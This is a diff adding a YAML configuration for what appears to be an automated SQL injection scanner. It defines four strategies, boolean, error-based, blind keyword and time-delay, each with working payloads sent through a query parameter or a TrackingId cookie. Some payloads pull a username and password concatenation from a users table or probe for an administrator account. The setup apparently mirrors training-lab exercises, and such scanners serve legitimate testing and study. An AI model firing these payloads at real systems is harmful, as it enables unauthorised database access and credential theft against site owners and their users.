@@ -1,0 +1,45 @@
+strategies:
+  - name: basic_hidden_data
+    description: Detects boolean-based GET SQLi by comparing response size.
+    target: query
+    detection:
+      type: length_delta
+      min_delta: 500
+    payloads:
+      - "' OR '1'='1"
+      - "' OR 1=1--"
+
+  - name: tracking_cookie_error
+    description: Oracle-style conditional errors via TrackingId cookie.
+    target: cookie
+    cookie_name: TrackingId
+    detection:
+      type: status_code
+      status: 500
+    payloads:
+      - "'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual)||'"
+      - "'||(SELECT username||password FROM users WHERE rownum=1)||'"
+
+  - name: tracking_cookie_welcome
+    description: Blind response-based injection via TrackingId cookie.
+    target: cookie
+    cookie_name: TrackingId
+    detection:
+      type: keyword_presence
+      keyword: "Welcome back!"
+    payloads:
+      - "' AND 1=1--"
+      - "' AND (SELECT 'x' FROM users LIMIT 1)='x'--"
+      - "' AND (SELECT username FROM users WHERE username='administrator')='administrator'--"
+
+  - name: tracking_cookie_time_delay
+    description: Time-delay payloads to confirm blind SQLi.
+    target: cookie
+    cookie_name: TrackingId
+    detection:
+      type: time_delay
+      threshold: 5
+    payloads:
+      - "'||(SELECT pg_sleep(5))||'"
+
+
